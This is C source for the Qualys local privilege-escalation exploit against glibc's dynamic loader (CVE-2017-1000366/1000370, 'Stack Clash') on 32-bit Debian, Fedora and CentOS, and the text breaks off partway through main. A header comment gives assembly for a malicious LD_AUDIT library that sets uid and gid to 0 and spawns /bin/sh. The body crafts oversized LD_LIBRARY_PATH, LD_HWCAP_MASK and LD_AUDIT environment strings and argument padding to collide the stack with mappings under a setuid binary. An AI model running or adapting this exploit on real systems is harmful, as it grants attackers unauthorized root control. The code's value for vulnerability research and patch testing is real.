/*
 * Linux_ldso_hwcap.c for CVE-2017-1000366, CVE-2017-1000370
 * Copyright (C) 2017 Qualys, Inc.
 *
 * my_important_hwcaps() adapted from elf/dl-hwcaps.c,
 * part of the GNU C Library:
 * Copyright (C) 2012-2017 Free Software Foundation, Inc.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

/**
cat > la.c << "EOF"
static void __attribute__ ((constructor)) _init (void) {
    __asm__ __volatile__ (
    "addl $64, %esp;"
    // setuid(0);
    "movl $23, %eax;"
    "movl $0, %ebx;"
    "int $0x80;"
    // setgid(0);
    "movl $46, %eax;"
    "movl $0, %ebx;"
    "int $0x80;"
    // dup2(0, 1);
    "movl $63, %eax;"
    "movl $0, %ebx;"
    "movl $1, %ecx;"
    "int $0x80;"
    // dup2(0, 2);
    "movl $63, %eax;"
    "movl $0, %ebx;"
    "movl $2, %ecx;"
    "int $0x80;"
    // execve("/bin/sh");
    "movl $11, %eax;"
    "pushl $0x0068732f;"
    "pushl $0x6e69622f;"
    "movl %esp, %ebx;"
    "movl $0, %edx;"
    "pushl %edx;"
    "pushl %ebx;"
    "movl %esp, %ecx;"
    "int $0x80;"
    // exit(0);
    "movl $1, %eax;"
    "movl $0, %ebx;"
    "int $0x80;"
    );
}
EOF
gcc -fpic -shared -nostdlib -Os -s -o la.so la.c
xxd -i la.so > la.so.h
**/

#define _GNU_SOURCE
#include <assert.h>
#include <elf.h>
#include <fcntl.h>
#include <limits.h>
#include <link.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/param.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define PAGESZ ((size_t)4096)
#define STACK_ALIGN ((size_t)16)
#define MALLOC_ALIGN ((size_t)8)

#define MMAP_BASE ((uintptr_t)0x40000000)
#define MMAP_RAND ((size_t)1<<20)

#define STACK_BASE ((uintptr_t)0xC0000000)
#define STACK_RAND ((size_t)8<<20)

#define MAX_ARG_STRLEN ((size_t)128<<10)
#define MAX_ARG_STRINGS ((size_t)0x7FFFFFFF)

static const struct target * target;
static const struct target {
    const char * name;
    size_t memalign_up;
    size_t nsystem_dirs_len;
    size_t sizeof_system_dirs;
    const char * repl_lib;
    int ignore_lib;
    int ignore_origin;
} targets[] = {
    {
        .name = "Debian 7 (wheezy)",
        .memalign_up = PAGESZ,
        .nsystem_dirs_len = 4,
        .sizeof_system_dirs = sizeof("/lib/i386-linux-gnu/\0" "/usr/lib/i386-linux-gnu/\0" "/lib/\0" "/usr/lib/"),
        .repl_lib = "lib/i386-linux-gnu",
        .ignore_lib = 0,
        .ignore_origin = 0,
    },
    {
        .name = "Debian 8 (jessie)",
        .memalign_up = PAGESZ,
        .nsystem_dirs_len = 4,
        .sizeof_system_dirs = sizeof("/lib/i386-linux-gnu/\0" "/usr/lib/i386-linux-gnu/\0" "/lib/\0" "/usr/lib/"),
        .repl_lib = "lib/i386-linux-gnu",
        .ignore_lib = 0,
        .ignore_origin = 0,
    },
    {
        .name = "Debian 9 (stretch)",
        .memalign_up = 2 * PAGESZ,
        .nsystem_dirs_len = 4,
        .sizeof_system_dirs = sizeof("/lib/i386-linux-gnu/\0" "/usr/lib/i386-linux-gnu/\0" "/lib/\0" "/usr/lib/"),
        .repl_lib = "lib/i386-linux-gnu",
        .ignore_lib = 0,
        .ignore_origin = 0,
    },
    {
        .name = "Debian 10 (buster)",
        .memalign_up = 2 * PAGESZ,
        .nsystem_dirs_len = 4,
        .sizeof_system_dirs = sizeof("/lib/i386-linux-gnu/\0" "/usr/lib/i386-linux-gnu/\0" "/lib/\0" "/usr/lib/"),
        .repl_lib = "lib/i386-linux-gnu",
        .ignore_lib = 0,
        .ignore_origin = 0,
    },
    {
        .name = "Fedora 23 (Server Edition)",
        .memalign_up = PAGESZ,
        .nsystem_dirs_len = 2,
        .sizeof_system_dirs = sizeof("/lib/\0" "/usr/lib/"),
        .repl_lib = "lib",
        .ignore_lib = 0,
        .ignore_origin = 0,
    },
    {
        .name = "Fedora 24 (Server Edition)",
        .memalign_up = PAGESZ,
        .nsystem_dirs_len = 2,
        .sizeof_system_dirs = sizeof("/lib/\0" "/usr/lib/"),
        .repl_lib = "lib",
        .ignore_lib = 0,
        .ignore_origin = 0,
    },
    {
        .name = "Fedora 25 (Server Edition)",
        .memalign_up = 2 * PAGESZ,
        .nsystem_dirs_len = 2,
        .sizeof_system_dirs = sizeof("/lib/\0" "/usr/lib/"),
        .repl_lib = "lib",
        .ignore_lib = 0,
        .ignore_origin = 0,
    },
    {
        .name = "CentOS 5.3 (Final)",
        .memalign_up = PAGESZ,
        .nsystem_dirs_len = 2,
        .sizeof_system_dirs = sizeof("/lib/\0" "/usr/lib/"),
        .repl_lib = "lib",
        .ignore_lib = 1,
        .ignore_origin = 0,
    },
    {
        .name = "CentOS 5.11 (Final)",
        .memalign_up = PAGESZ,
        .nsystem_dirs_len = 2,
        .sizeof_system_dirs = sizeof("/lib/\0" "/usr/lib/"),
        .repl_lib = "lib",
        .ignore_lib = 0,
        .ignore_origin = 1,
    },
    {
        .name = "CentOS 6.0 (Final)",
        .memalign_up = PAGESZ,
        .nsystem_dirs_len = 2,
        .sizeof_system_dirs = sizeof("/lib/\0" "/usr/lib/"),
        .repl_lib = "lib",
        .ignore_lib = 0,
        .ignore_origin = 0,
    },
    {
        .name = "CentOS 6.8 (Final)",
        .memalign_up = PAGESZ,
        .nsystem_dirs_len = 2,
        .sizeof_system_dirs = sizeof("/lib/\0" "/usr/lib/"),
        .repl_lib = "lib",
        .ignore_lib = 0,
        .ignore_origin = 1,
    },
    {
        .name = "CentOS 7.2.1511 (AltArch)",
        .memalign_up = PAGESZ,
        .nsystem_dirs_len = 2,
        .sizeof_system_dirs = sizeof("/lib/\0" "/usr/lib/"),
        .repl_lib = "lib",
        .ignore_lib = 0,
        .ignore_origin = 0,
    },
};

#define die() do { \
    printf("died in %s: %u\n", __func__, __LINE__); \
    exit(EXIT_FAILURE); \
} while (0)

static const ElfW(auxv_t) * my_auxv;

static unsigned long int
my_getauxval (const unsigned long int type)
{
    const ElfW(auxv_t) * p;

    if (!my_auxv) die();
    for (p = my_auxv; p->a_type != AT_NULL; p++)
        if (p->a_type == type)
            return p->a_un.a_val;
    die();
}

static size_t
get_elf_mmaps(const char * const binary)
{
    if (!binary) die();
    if (*binary != '/') die();
    struct stat st;
    if (stat(binary, &st)) die();
    if (!S_ISREG(st.st_mode)) die();
    if (st.st_size <= 0) die();
    #define SAFESZ ((size_t)64<<20)
    if (st.st_size >= (ssize_t)SAFESZ) die();
    const size_t size = st.st_size;
    printf("%s %zu mmaps ", binary, size);

    const int fd = open(binary, O_RDONLY);
    if (fd <= -1) {
        const size_t mmaps = (size + PAGESZ-1) & ~(PAGESZ-1);
        printf("%zu (unreadable)\n", mmaps);
        return mmaps;
    }
    uint8_t * const buf = malloc(size);
    if (!buf) die();
    if (read(fd, buf, size) != (ssize_t)size) die();
    if (close(fd)) die();

    if (size <= sizeof(ElfW(Ehdr))) die();
    const ElfW(Ehdr) * const ehdr = (const ElfW(Ehdr) *)buf;
    if (ehdr->e_ident[EI_MAG0] != ELFMAG0) die();
    if (ehdr->e_ident[EI_MAG1] != ELFMAG1) die();
    if (ehdr->e_ident[EI_MAG2] != ELFMAG2) die();
    if (ehdr->e_ident[EI_MAG3] != ELFMAG3) die();
    if (ehdr->e_ident[EI_CLASS] != ELFCLASS32) die();
    if (ehdr->e_ident[EI_DATA] != ELFDATA2LSB) die();
    if (ehdr->e_machine != EM_386) die();
    if (ehdr->e_version != EV_CURRENT) die();
    if (ehdr->e_ehsize != sizeof(ElfW(Ehdr))) die();
    if (ehdr->e_phentsize != sizeof(ElfW(Phdr))) die();
    if (ehdr->e_shentsize != sizeof(ElfW(Shdr))) die();
    if (ehdr->e_phoff <= 0 || ehdr->e_phoff >= size) die();
    if (ehdr->e_shoff <= 0 || ehdr->e_shoff >= size) die();
    if (ehdr->e_phnum > (size - ehdr->e_phoff) / sizeof(ElfW(Phdr))) die();
    if (ehdr->e_shnum > (size - ehdr->e_shoff) / sizeof(ElfW(Shdr))) die();

    if (ehdr->e_type != ET_DYN) {
        if (ehdr->e_type != ET_EXEC) die();
        const size_t mmaps = 0;
        printf("%zu (executable)\n", mmaps);
        free(buf);
        return mmaps;
    }

    uintptr_t first_map_start = UINTPTR_MAX;
    uintptr_t last_map_end = 0;
    unsigned int i;
    for (i = 0; i < ehdr->e_phnum; i++) {
        const ElfW(Phdr) * const phdr = (const ElfW(Phdr) *)(buf + ehdr->e_phoff) + i;
        if (phdr->p_type != PT_LOAD) continue;

        if (phdr->p_offset >= size) die();
        if (phdr->p_filesz > size - phdr->p_offset) die();
        if (phdr->p_filesz > phdr->p_memsz) die();
        if (phdr->p_vaddr >= STACK_BASE) die();
        if (phdr->p_memsz <= 0) die();
        if (phdr->p_memsz >= SAFESZ) die();
        #undef SAFESZ
        if (phdr->p_align != PAGESZ) die();

        const uintptr_t map_start = phdr->p_vaddr & ~(PAGESZ-1);
        if (map_start >= UINTPTR_MAX) die();
        if (map_start < last_map_end) die();

        const uintptr_t map_end = (phdr->p_vaddr + phdr->p_memsz + PAGESZ-1) & ~(PAGESZ-1);
        if (map_end <= map_start) die();
        if (map_end <= 0) die();

        if (first_map_start >= UINTPTR_MAX) {
            first_map_start = map_start;
        }
        last_map_end = map_end;

        switch (phdr->p_flags) {
            case PF_R | PF_X:
                break;
            case PF_R | PF_W:
                if (map_start <= first_map_start) die();
                break;
            default:
                die();
        }
    }
    if (first_map_start >= UINTPTR_MAX) die();
    if (last_map_end <= 0) die();
    if (last_map_end <= first_map_start) die();
    const size_t mmaps = last_map_end - first_map_start;
    printf("%zu (%sshared object)\n", mmaps, first_map_start ? "prelinked " : "");
    free(buf);
    return mmaps;
}

static const char my_x86_cap_flags[32][8] = {
    "fpu", "vme", "de", "pse", "tsc", "msr", "pae", "mce",
    "cx8", "apic", "10", "sep", "mtrr", "pge", "mca", "cmov",
    "pat", "pse36", "pn", "clflush", "20", "dts", "acpi", "mmx",
    "fxsr", "sse", "sse2", "ss", "ht", "tm", "ia64", "pbe"
};

static const char my_x86_platforms[4][5] = {
    "i386", "i486", "i586", "i686"
};

static inline const char *
my_hwcap_string (const unsigned int idx)
{
    if (idx >= sizeof(my_x86_cap_flags) / sizeof(my_x86_cap_flags[0])) die();
    return my_x86_cap_flags[idx];
}

struct my_important_hwcaps {
    unsigned long hwcap_mask;
    size_t max_capstrlen;
    size_t pointers;
    size_t strings;
    size_t search_dirs;
    size_t search_dirs_0;
};

struct my_link_map {
    const ElfW(Phdr) * l_phdr;
    ElfW(Half) l_phnum;
    ElfW(Addr) l_addr;
};

/* We want to cache information about the searches for shared objects.  */

enum r_dir_status { unknown, nonexisting, existing };

struct r_search_path_elem
  {
    /* This link is only used in the `all_dirs' member of `r_search_path'.  */
    struct r_search_path_elem *next;

    /* Strings saying where the definition came from.  */
    const char *what;
    const char *where;

    /* Basename for this search path element.  The string must end with
       a slash character.  */
    const char *dirname;
    size_t dirnamelen;

    enum r_dir_status status[0];
  };

struct r_strlenpair
  {
    const char *str;
    size_t len;
  };

/* Return an array of useful/necessary hardware capability names.  */
static struct my_important_hwcaps
my_important_hwcaps (const char * const platform, const size_t platform_len,
                     const uint64_t hwcap, const uint64_t hwcap_mask,
                     const struct my_link_map * sysinfo_map)
{
  static const struct my_important_hwcaps err;
  /* Determine how many important bits are set.  */
  uint64_t masked = hwcap & hwcap_mask;
  size_t cnt = platform != NULL;
  size_t n, m;
  size_t total;
  struct r_strlenpair *result;

  /* Count the number of bits set in the masked value.  */
  for (n = 0; (~((1ULL << n) - 1) & masked) != 0; ++n)
    if ((masked & (1ULL << n)) != 0)
      ++cnt;

  /* The system-supplied DSO can contain a note of type 2, vendor "GNU".
     This gives us a list of names to treat as fake hwcap bits.  */

  const char *dsocaps = NULL;
  size_t dsocapslen = 0;
  if (sysinfo_map != NULL)
    {
      const ElfW(Phdr) *const phdr = sysinfo_map->l_phdr;
      const ElfW(Word) phnum = sysinfo_map->l_phnum;
      uint_fast16_t i;
      for (i = 0; i < phnum; ++i)
        if (phdr[i].p_type == PT_NOTE)
          {
            const ElfW(Addr) start = (phdr[i].p_vaddr
                                      + sysinfo_map->l_addr);
            /* The standard ELF note layout is exactly as the anonymous struct.
               The next element is a variable length vendor name of length
               VENDORLEN (with a real length rounded to ElfW(Word)), followed
               by the data of length DATALEN (with a real length rounded to
               ElfW(Word)).  */
            const struct
            {
              ElfW(Word) vendorlen;
              ElfW(Word) datalen;
              ElfW(Word) type;
            } *note = (const void *) start;
            while ((ElfW(Addr)) (note + 1) - start < phdr[i].p_memsz)
              {
#define ROUND(len) (((len) + sizeof (ElfW(Word)) - 1) & -sizeof (ElfW(Word)))
                /* The layout of the type 2, vendor "GNU" note is as follows:
                   .long <Number of capabilities enabled by this note>
                   .long <Capabilities mask> (as mask >> _DL_FIRST_EXTRA).
                   .byte <The bit number for the next capability>
                   .asciz <The name of the capability>.  */
                if (note->type == NT_GNU_HWCAP
                    && note->vendorlen == sizeof "GNU"
                    && !memcmp ((note + 1), "GNU", sizeof "GNU")
                    && note->datalen > 2 * sizeof (ElfW(Word)) + 2)
                  {
                    const ElfW(Word) *p = ((const void *) (note + 1)
                                           + ROUND (sizeof "GNU"));
                    cnt += *p++;
                    ++p;        /* Skip mask word.  */
                    dsocaps = (const char *) p; /* Pseudo-string "<b>name"  */
                    dsocapslen = note->datalen - sizeof *p * 2;
                    break;
                  }
                note = ((const void *) (note + 1)
                        + ROUND (note->vendorlen) + ROUND (note->datalen));
#undef ROUND
              }
            if (dsocaps != NULL)
              break;
          }
    }

  /* For TLS enabled builds always add 'tls'.  */
  ++cnt;

  /* Create temporary data structure to generate result table.  */
  if (cnt < 2) return err;
  if (cnt >= 32) return err;
  struct r_strlenpair temp[cnt];
  m = 0;
  if (dsocaps != NULL)
    {
      /* dsocaps points to the .asciz string, and -1 points to the mask
         .long just before the string.  */
      const ElfW(Word) mask = ((const ElfW(Word) *) dsocaps)[-1];
      size_t len;
      const char *p;
      for (p = dsocaps; p < dsocaps + dsocapslen; p += len + 1)
        {
          uint_fast8_t bit = *p++;
          len = strlen (p);

          /* Skip entries that are not enabled in the mask word.  */
          if (mask & ((ElfW(Word)) 1 << bit))
            {
              temp[m].str = p;
              temp[m].len = len;
              ++m;
            }
          else
            --cnt;
        }
    }
  for (n = 0; masked != 0; ++n)
    if ((masked & (1ULL << n)) != 0)
      {
        temp[m].str = my_hwcap_string (n);
        temp[m].len = strlen (temp[m].str);
        masked ^= 1ULL << n;
        ++m;
      }
  if (platform != NULL)
    {
      temp[m].str = platform;
      temp[m].len = platform_len;
      ++m;
    }

  temp[m].str = "tls";
  temp[m].len = 3;
  ++m;

  assert (m == cnt);

  /* Determine the total size of all strings together.  */
  if (cnt == 1)
    total = temp[0].len + 1;
  else
    {
      total = temp[0].len + temp[cnt - 1].len + 2;
      if (cnt > 2)
        {
          total <<= 1;
          for (n = 1; n + 1 < cnt; ++n)
            total += temp[n].len + 1;
          if (cnt > 3
              && (cnt >= sizeof (size_t) * 8
                  || total + (sizeof (*result) << 3)
                     >= (1UL << (sizeof (size_t) * 8 - cnt + 3))))
            return err;

          total <<= cnt - 3;
        }
    }

  /* The result structure: we use a very compressed way to store the
     various combinations of capability names.  */
  const size_t _sz = 1 << cnt;

  /* Now we are ready to install the string pointers and length.  */
  size_t max_capstrlen = 0;
  n = cnt;
  do
    {
      const size_t mask = 1 << --n;
      for (m = 1 << cnt; m > 0; ) {
        if ((--m & mask) != 0)
          max_capstrlen += temp[n].len + 1;
        break;
      }
    }
  while (n != 0);

  const size_t round_size =
      (2 * sizeof (struct r_search_path_elem) - 1 + _sz * sizeof (enum r_dir_status))
         / sizeof (struct r_search_path_elem);
  if (hwcap_mask > ULONG_MAX) die();

  const struct my_important_hwcaps ret = {
      .hwcap_mask = hwcap_mask,
      .max_capstrlen = max_capstrlen,
      .pointers = _sz * sizeof (*result),
      .strings = total,
      .search_dirs = (target->nsystem_dirs_len + 1) * sizeof (struct r_search_path_elem *),
      .search_dirs_0 = target->sizeof_system_dirs * round_size * sizeof (struct r_search_path_elem)
  };
  return ret;
}

static size_t
my_bsearch(const void * const key,
    const void * const base, const size_t nmemb, const size_t size,
    int (* const compar)(const void *, const void *))
{
    if (!key) die();
    if (!size) die();
    if (!compar) die();
    if (nmemb >= SSIZE_MAX / size) die();
    if (!base != !nmemb) die();
    if (!base || !nmemb) return 0;

    size_t low = 0;
    size_t high = nmemb - 1;
    while (low <= high) {
        const size_t mid = low + (high - low) / 2;
        if (mid >= nmemb) die();
        const int cond = compar(key, base + mid * size);
        switch (cond) {
        case 0:
            return mid;
        case -1:
            if (mid <= 0) {
                if (mid != 0) die();
                if (low != 0) die();
                return low;
            }
            high = mid - 1;
            break;
        case +1:
            low = mid + 1;
            break;
        default:
            die();
        }
    }
    if (low > nmemb) die();
    return low;
}

static int
cmp_important_hwcaps(const void * const _a, const void * const _b)
{
    const struct my_important_hwcaps * const a = _a;
    const struct my_important_hwcaps * const b = _b;

    if (a->strings < b->strings) return -1;
    if (a->strings > b->strings) return +1;

    if (a->pointers < b->pointers) return -1;
    if (a->pointers > b->pointers) return +1;

    if (a->search_dirs_0 < b->search_dirs_0) return -1;
    if (a->search_dirs_0 > b->search_dirs_0) return +1;

    if (a->max_capstrlen < b->max_capstrlen) return -1;
    if (a->max_capstrlen > b->max_capstrlen) return +1;

    return 0;
}

struct audit_list
{
  const char *name;
  struct audit_list *next;
};

int
main(const int my_argc, const char * const my_argv[], const char * const my_envp[])
{
  {
    const char * const * p = my_envp;
    while (*p++) ;
    my_auxv = (const void *)p;
  }
    if (my_getauxval(AT_PAGESZ) != PAGESZ) die();
  {
    struct timeval tv;
    if (gettimeofday(&tv, NULL)) die();
    srandom(getpid() ^ tv.tv_sec ^ tv.tv_usec);
  }
    if (my_argc != 1+2) {
        printf("Usage: %s target binary\n", my_argv[0]);
        size_t i;
        for (i = 0; i < sizeof(targets)/sizeof(*targets); i++) {
            printf("Target %zu %s\n", i, targets[i].name);
        }
        die();
    }
  {
    const size_t i = strtoul(my_argv[1], NULL, 10);
    if (i >= sizeof(targets)/sizeof(*targets)) die();
    target = targets + i;
    printf("Target %zu %s\n", i, target->name);
  }
    printf("mau %zu nsd %zu ssd %zu rl %s il %d io %d\n",
        target->memalign_up, target->nsystem_dirs_len, target->sizeof_system_dirs,
        target->repl_lib, target->ignore_lib, target->ignore_origin);

    if (target->memalign_up % PAGESZ) die();
    if (target->ignore_lib < 0 || target->ignore_origin < 0) die();
    if (target->ignore_lib > 1 || target->ignore_origin > 1) die();

    const char * const binary = realpath(my_argv[2], NULL);
    if (!binary) die();
    if (*binary != '/') die();
    if (access(binary, X_OK)) die();

    const char * const slash = strrchr(binary, '/');
    if (!slash) die();
    if (slash <= binary) die();
    const char * const origin = strndup(binary, slash - binary);
    if (!origin) die();
    printf("origin %s (%zu)\n", origin, strlen(origin));

    const char * const platform = (const void *)my_getauxval(AT_PLATFORM);
    if (!platform) die();
    const size_t platform_len = strlen(platform);
    if (platform_len != 4) die();
  {
    size_t i;
    for (i = 0; ; i++) {
        if (i >= sizeof(my_x86_platforms) / sizeof(my_x86_platforms[0])) die();
        if (strcmp(platform, my_x86_platforms[i]) == 0) break;
    }
  }
    const struct {
        const char * str;
        size_t len;
        size_t repl_len;
    } DSTs[] = {
        #define DST_LIB "LIB"
        { DST_LIB, strlen(DST_LIB), strlen(target->repl_lib) },
        #define DST_PLATFORM "PLATFORM"
        { DST_PLATFORM, strlen(DST_PLATFORM), platform_len }
    };
    size_t repl_max = target->ignore_origin ? 0 : strlen(origin);
  {
    size_t i;
    for (i = target->ignore_lib ? 1 : 0; i < sizeof(DSTs)/sizeof(*DSTs); i++) {
        if (repl_max < DSTs[i].repl_len)
            repl_max = DSTs[i].repl_len;
    }
  }
    printf("repl_max %zu\n", repl_max);
    if (repl_max < 4) die();

    const ElfW(Ehdr) * const sysinfo_dso = (const void *)my_getauxval(AT_SYSINFO_EHDR);
    if (!sysinfo_dso) die();
    struct my_link_map sysinfo_map = {
        .l_phdr = (const void *)sysinfo_dso + sysinfo_dso->e_phoff,
        .l_phnum = sysinfo_dso->e_phnum,
        .l_addr = ULONG_MAX
    };
  {
    uint_fast16_t i;
    for (i = 0; i < sysinfo_map.l_phnum; ++i) {
        const ElfW(Phdr) * const ph = &sysinfo_map.l_phdr[i];
        if (ph->p_type == PT_LOAD) {
            if (sysinfo_map.l_addr == ULONG_MAX)
                sysinfo_map.l_addr = ph->p_vaddr;
        }
    }
  }
    if (sysinfo_map.l_addr == ULONG_MAX) die();
    sysinfo_map.l_addr = (ElfW(Addr))sysinfo_dso - sysinfo_map.l_addr;

    const unsigned long hwcap = my_getauxval(AT_HWCAP);
    if (!hwcap) die();
    struct my_important_hwcaps * important_hwcaps = NULL;
    size_t num_important_hwcaps = 0;
  {
    size_t max_important_hwcaps = 0;
    uint32_t hwcap_mask = 1;
    do {
        if (hwcap_mask & ~hwcap) continue;
        const uint64_t popcount = __builtin_popcount(hwcap_mask);
        if (popcount < 1) die();
        if (popcount > 32) die();
        if ((((2+1) * (2*2 + popcount)) << (popcount-1)) + PAGESZ
            >= MAX_ARG_STRLEN + (MAX_ARG_STRLEN / (4+1)) * (repl_max - (target->ignore_lib ? 7 : 4))) continue;

        const struct my_important_hwcaps ihc = my_important_hwcaps(platform, platform_len, hwcap, hwcap_mask, &sysinfo_map);
        if (!ihc.pointers) die();

        const size_t idx = my_bsearch(&ihc, important_hwcaps, num_important_hwcaps, sizeof(struct my_important_hwcaps), cmp_important_hwcaps);
        if (idx > num_important_hwcaps) die();

        if (idx == num_important_hwcaps || cmp_important_hwcaps(&ihc, important_hwcaps + idx)) {
            if (num_important_hwcaps >= max_important_hwcaps) {
                if (num_important_hwcaps != max_important_hwcaps) die();
                if (max_important_hwcaps >= 65536) die();
                max_important_hwcaps += 256;

                if (num_important_hwcaps >= max_important_hwcaps) die();
                important_hwcaps = realloc(important_hwcaps, max_important_hwcaps * sizeof(struct my_important_hwcaps));
                if (!important_hwcaps) die();
            }
            memmove(important_hwcaps + idx + 1, important_hwcaps + idx, (num_important_hwcaps - idx) * sizeof(struct my_important_hwcaps));
            important_hwcaps[idx] = ihc;
            num_important_hwcaps++;
        }
    } while (++hwcap_mask);
  }
    printf("num_important_hwcaps %zu\n", num_important_hwcaps);

    static struct {
        double probability;
        struct my_important_hwcaps ihc;
        size_t gwr, dst, cnt;
    } best;

    #define LIB "/lib"
    #define SEP_LIB ":" LIB
    #define LLP "LD_LIBRARY_PATH="
    static char llp[MAX_ARG_STRLEN];
    #define MAX_GWR ((sizeof(llp) - (sizeof(LLP)-1 + sizeof(SEP_LIB)-1 + 1)) & ~(MALLOC_ALIGN-1))
    size_t gwr;
    for (gwr = MAX_GWR; gwr >= 128; gwr -= MALLOC_ALIGN) {
        size_t dst;
        for (dst = 0; dst < sizeof(DSTs)/sizeof(*DSTs); dst++) {
            const size_t cnt = (MAX_GWR - gwr) / (1 + DSTs[dst].len + 1);
            const size_t gpj = (sizeof(SEP_LIB)-1 + MAX_GWR + cnt * (repl_max - (target->ignore_lib ? 7 : 4)) + 1 + STACK_ALIGN-1) & ~(STACK_ALIGN-1);
            const size_t bwr = (sizeof(SEP_LIB)-1 + cnt * (DSTs[dst].repl_len + 1)) + ((MAX_GWR - gwr) - cnt * (1 + DSTs[dst].len + 1)) + 1;

            const struct my_important_hwcaps key = { .strings = gwr + bwr };
            if (key.pointers) die();

            size_t idx = my_bsearch(&key, important_hwcaps, num_important_hwcaps, sizeof(struct my_important_hwcaps), cmp_important_hwcaps);
            for (; idx < num_important_hwcaps; idx++) {
                const struct my_important_hwcaps ihc = important_hwcaps[idx];
                if (ihc.strings < gwr + bwr) die();
                if (ihc.max_capstrlen % MALLOC_ALIGN >= sizeof("/..")) continue;
                if (ihc.search_dirs_0 >= STACK_RAND) continue;

                const size_t min = MIN(gwr, ihc.pointers);
                if (gpj < min + ihc.strings + ihc.search_dirs + 2 * target->memalign_up + 2 * PAGESZ + (target->ignore_origin ? 0 : PATH_MAX)) continue;

                const double probability =
                    (double)((uint64_t)(STACK_RAND - ihc.search_dirs_0) * (uint64_t)min) /
                    (double)((uint64_t)STACK_RAND * (uint64_t)(MMAP_RAND + (STACK_RAND - ihc.search_dirs_0)));
                if (best.probability < probability) {
                    best.probability = probability;
                    best.ihc = ihc;
                    best.gwr = gwr;
                    best.dst = dst;
                    best.cnt = cnt;
                    printf("len %zu ihcp %zu ihcs %zu sd %zu sd0 %zu gpj %zu gwr %zu bwr %zu cnt %zu dst %zu repl %zu probability 1/%zu (%.10g) mask %lx\n",
                        ihc.max_capstrlen, ihc.pointers, ihc.strings, ihc.search_dirs, ihc.search_dirs_0, gpj, gwr, bwr, cnt, DSTs[dst].len, DSTs[dst].repl_len,
                        (size_t)(1 / probability), probability, ihc.hwcap_mask);
                }
            }
        }
    }
    if (!best.probability) die();
    if (STACK_BASE <= MMAP_BASE) die();
    const size_t mmap_size = ((STACK_BASE - MMAP_BASE) / 2) - MMAP_RAND / 2
        - (get_elf_mmaps(binary) + get_elf_mmaps("/lib/ld-linux.so.2") + best.ihc.pointers + best.ihc.strings + best.ihc.search_dirs);
    const size_t stack_size = ((STACK_BASE - MMAP_BASE) / 2) - ((STACK_RAND + best.ihc.search_dirs_0) / 2);
    printf("mmap_size %zu stack_size %zu\n", mmap_size, stack_size);

    #define REL_LA "a"
    #define LDA "LD_AUDIT="
    static char lda[MAX_ARG_STRLEN];
    #define MAX_RLDAS ((sizeof(lda) - sizeof(LDA)) / sizeof(REL_LA))
    if (sizeof(struct audit_list) % MALLOC_ALIGN) die();
    const size_t ldas = (mmap_size / sizeof(struct audit_list)) / MAX_RLDAS;
    if (ldas >= MAX_ARG_STRINGS / 3) die();

    #define INITIAL_STACK_EXPANSION (131072UL)
    const size_t pads = INITIAL_STACK_EXPANSION / sizeof(char *) - ldas;
    if (pads >= INITIAL_STACK_EXPANSION / sizeof(char *)) die();
    if (pads >= MAX_ARG_STRINGS / 3) die();
    static char pad[MAX_ARG_STRLEN];
  {
    const size_t padl = (stack_size - sizeof(llp) - ldas * (sizeof(lda) + sizeof(char *)) - pads * sizeof(char *)) / pads;
    if (padl >= sizeof(pad)) die();
    if (padl <= 0) die();
    memset(pad, ' ', padl-1);
    printf("ldas %zu pads %zu padl %zu\n", ldas, pads, padl);
  }

  {
    char * cp = mempcpy(llp, LLP, sizeof(LLP)-1);
    memset(cp, '/', MAX_GWR);
    memcpy(cp + MAX_GWR, SEP_LIB, sizeof(SEP_LIB)-1);
    if (*(cp + MAX_GWR + sizeof(SEP_LIB)-1)) die();

    #define LIB_TO_TMP "/../tmp/"
    if (sizeof(LIB_TO_TMP)-1 != MALLOC_ALIGN) die();

    if (!best.gwr) die();
    if (best.gwr >= MAX_GWR) die();
    if (best.gwr % MALLOC_ALIGN) die();
    size_t i;
    for (i = 0; i < best.gwr / MALLOC_ALIGN; i++) {
        cp = mempcpy(cp, LIB_TO_TMP, MALLOC_ALIGN);
    }
    if (!best.cnt) die();
    if (best.dst >= sizeof(DSTs)/sizeof(*DSTs)) die();
    for (i = 0; i < best.cnt; i++) {
        *cp++ = '$';
        cp = mempcpy(cp, DSTs[best.dst].str, DSTs[best.dst].len);
        *cp++ = '/';
    }
    if (cp >= llp + sizeof(llp)) die();
    if (llp[sizeof(llp)-1]) die();
  }

    #define LHCM "LD_HWCAP_MASK="
    static char lhcm[64];
    if ((unsigned int)snprintf(lhcm, sizeof(lhcm), "%s%lu", LHCM, best.ihc.hwcap_mask)
                                  >= sizeof(lhcm)) die();
  {
    char * cp = mempcpy(lda, LDA, sizeof(LDA)-1);
    size_t i;
    for (i = 0; i < MAX_RLDAS; i++) {
        cp = mempcpy(cp, REL_LA ":", sizeof(REL_LA));
    }
    if (cp >= lda + sizeof(lda)) die();
    if (*cp) die();
  }
    static char rlda[MAX_ARG_STRLEN];

    const size_t args = 1 + pads + 1;
    char ** const argv = calloc(args, sizeof(char *));
    if (!argv) die();
  {
    char ** ap = argv;
    *ap++ = (char *)binary;
    size_t i;
    for (i = 0; i < pads; i++) {
        *ap++ = pad;
    }
    *ap++ = NULL;
    if (ap != argv + args) die();
  }

    const size_t envs = 2 + ldas + 2;
    char ** const envp = calloc(envs, sizeof(char *));
    if (!envp) die();
  {
    char ** ep = envp;
    *ep++ = llp;
    *ep++ = lhcm;
    size_t i;
    for (i = 0; i < ldas; i++) {
        *ep++ = lda;
    }
    *ep++ = rlda;
    *ep++ = NULL;
    if (ep != envp + envs) die();
  }

  {
    static const struct rlimit rlimit_stack = { RLIM_INFINITY, RLIM_INFINITY };
    if (setrlimit(RLIMIT_STACK, &rlimit_stack)) die();
  }
    int pipefd[2];
    if (pipe(pipefd)) die();
    if (close(pipefd[0])) die();
    pipefd[0] = -1;
    if (signal(SIGPIPE, SIG_DFL) == SIG_ERR) die();

  {
    #define ABS_LA_DIR "/" LIB "/" LIB_TO_TMP "/"
    static const char * const abs_las[] = {
        ABS_LA_DIR "" REL_LA,
        ABS_LA_DIR "/" REL_LA,
